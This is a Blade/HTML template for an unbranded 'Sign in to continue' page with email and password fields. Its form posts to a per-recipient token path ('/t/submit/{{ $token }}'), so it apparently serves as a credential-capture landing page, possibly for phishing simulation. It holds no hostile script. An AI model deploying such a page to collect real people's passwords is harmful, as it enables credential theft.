<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gray-100 flex items-center justify-center px-4">

<div class="w-full max-w-sm bg-white rounded-xl shadow-lg p-8">
  <div class="text-center mb-6">
    <div class="w-12 h-12 bg-blue-600 rounded-xl mx-auto mb-3 flex items-center justify-center">
      <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
      </svg>
    </div>
    <h1 class="text-xl font-semibold text-gray-800">Sign in to continue</h1>
    <p class="text-gray-500 text-sm mt-1">Enter your credentials to access your account</p>
  </div>

  <form method="POST" action="/t/submit/{{ $token }}" class="space-y-4">
    @csrf
    <div>
      <label class="block text-sm font-medium text-gray-700 mb-1">Email address</label>
      <input type="email" name="email" required autofocus
        class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent">
    </div>
    <div>
      <label class="block text-sm font-medium text-gray-700 mb-1">Password</label>
      <input type="password" name="password" required
        class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent">
    </div>
    <button type="submit"
      class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 rounded-lg text-sm transition-colors">
      Sign In
    </button>
  </form>

  <p class="text-center text-xs text-gray-400 mt-4">
    Having trouble signing in? <a href="#" class="text-blue-500">Contact support</a>
  </p>
</div>

</body>
</html>
